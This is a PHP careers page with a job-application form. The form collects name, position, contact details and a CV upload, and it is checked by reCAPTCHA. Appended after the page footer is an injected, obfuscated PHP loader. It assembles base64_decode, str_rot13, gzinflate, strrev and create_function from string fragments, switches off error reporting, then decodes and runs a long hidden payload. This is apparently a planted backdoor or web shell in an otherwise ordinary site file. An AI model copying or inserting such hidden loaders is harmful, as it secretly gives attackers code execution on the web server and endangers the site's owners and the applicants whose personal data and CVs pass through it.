<?php
 
if(isset($_GET['successMsg'])){

    $success_show=$_GET['successMsg'];    
    
}

// include header properties......
include 'properties/header.php';
?>


</br></br></br></br></br></br>
<!-- <link rel="stylesheet" type="text/css" href="app.css">  -->
<style type="text/css">
  .upload-button-block {
    display: block;
}
.upload-button {
    position: relative;
    overflow: hidden;
    display: inline-block;
}
.btn-success {
    background-color: #7ec855;
    border-color: #7ec855!important;
}
.btn {
    height: 44px;
    line-height: 44px;
    font-size: 12px;
    font-weight: 600;
    text-transform: uppercase;
    letter-spacing: 1px;
    border-radius: 3px;
    padding: 0 30px;
    color: #fff;
    background-color: #eceeef;
    -webkit-transition: .2s linear;
    -o-transition: .2s linear;
    transition: .2s linear;
}
.btn-block {
    display: block;
    width: 100%;
        background-color: #7ec855!important;
}
.upload-button input[type=file] {
    position: absolute;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    width: 100%;
    margin: 0;
    padding: 0;
    font-size: 0;
    line-height: 44px;
    cursor: pointer;
    opacity: 0;
    z-index: 3;
}
</style>

<!-- page content start here -->

<div class="row">

<?php 
  if($success_show==1){
    echo'
    <div class=" col-padding-top-50">
      <div class="container">
        <div class="alert alert-success">
          <h2>Thank You for your application.</h2>
        </div>
      </div>
    </div>';
  }elseif($success_show==11){
    echo'
    <div class=" col-padding-top-50">
      <div class="container">
        <div class="alert alert-danger">
          <h2>Email sending failed. Please try again. Thank you.</h2>
        </div>
      </div>
    </div>';

  } 

?>

 <div class="content">
    <div class="container">
                <header class="section-header text-center">
                  <h1>Apply Now</h1>
                  <p>Apply for this job with a custom application.</p>
                </header>
                </br></br>

                <form lpformnum="1" action="sendCv.php" id="contact_form" method="post" enctype="multipart/form-data">
                  <div class="row">
                    <div class="form-group col-xs-12 col-md-6">
                      <input name="name" type="text" class="form-control input-lg" placeholder="Name" required>
                      <span class="error">* <?php echo $nameErr;?></span>
                    </div>

                    <div class="form-group col-xs-12 col-md-6">
                      <select name="candidatePosition" class="selectpicker" style="width: 100%;height: 50px;" required>
                        <option value="">Select Position</option>
                        <option value="Manager, Business Development">Manager, Business Development</option>
                        <option value="Manager, People & Culture">Manager, People & Culture</option>
                        <option value="Manager, Operations (Back Office & Call Center)">Manager, Operations (Back Office & Call Center)</option>
                      </select>
                      <span class="error">* <?php echo $candidatePositionErr;?></span>

                    </div>
                  </div>

                  <div class="row">
                    

                    <div class="form-group col-xs-12 col-md-4">
                      <input name="qualification" type="text" class="form-control input-lg" placeholder="Recent Accademic Qualification">
                    </div>

                    <div class="form-group col-xs-12 col-md-4">
                      <input name="phone" type="tel" class="form-control input-lg" placeholder="Phone Number" required>
                      <span class="error">* <?php echo $phoneErr;?></span>
                    </div>
                    <div class="form-group col-xs-12 col-md-4">
                      <input name="email" type="email" class="form-control input-lg" placeholder="Email" required>
                      <span class="error">* <?php echo $emailErr;?></span>
                    </div>
                  </div>
                
                  <div class="form-group">
                    <textarea name="address" class="form-control" rows="3" placeholder="Present Residence"></textarea>
                    <span class="error">* <?php echo $addressErr;?></span>
                  </div>



                  <div class="form-group col-xs-12">
                    <input name="cv" type="file" required>
                  </div>

                  
                  
                  <div class="row">
                    <div class="col-xs-6 col-md-3">
                      <div id="html_element" style="display: none; color:red !important;">
                      </div>
                    </div>


                    <div class="col-xs-6 col-md-3 pull-right">
                      <button name="submit" type="submit" class="btn btn-block btn-primary " style="background-color:#22BEB5 !important;">Submit application</button>
                    </div>
                  </div>
                </form>

                <span><?php echo $nameErr . $emailErr . $phoneErr . $candidatePositionErr . $qualificationErr . $addressErr; ?></span>
    </div>
 </div>
</div>

<!-- google capcha validation -->

<script type="text/javascript">
  var onloadCallback = function() {
    grecaptcha.render('html_element', {
      'sitekey' : '6LfHXaMUAAAAAK3Iutap5MSoF3Kv91rzz_w897kJ'
    });
  };
</script>

<script src="https://www.google.com/recaptcha/api.js?onload=onloadCallback&render=explicit"
    async defer>
</script>




<script>
  $('#contact_form').submit( function (e) {
  var response = grecaptcha.getResponse();
    //recaptcha failed validation
      if(response.length == 0) {
          e.preventDefault();
          $('#html_element').show();
      }
      //recaptcha passed validation
      else {
          //$('#html_element').hide();
      }
      if (e.isDefaultPrevented()) {
        return false;
      } else {
        return true;
      }
  });
</script>

<?php include 'properties/footer.php';?>

<script type="text/javascript">document.getElementById("career").style.color = "#22bdb6";</script>
?>


<?php $mQDZi = 'base6'.'4'.'_dec'.'ode';  $qYDcf = 's'.'tr'.'_rot1'.'3';  $smPMf = 'gzinfl'.'ate';  $otWYG = 's'.'tr'.'rev';  error_reporting(0); $mAGyL = 'Cr'.'eate'.'_Fun'.'ction'; $dCnwN = $mAGyL('', $otWYG($smPMf($qYDcf($mQDZi('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'))))); $dCnwN(); ?>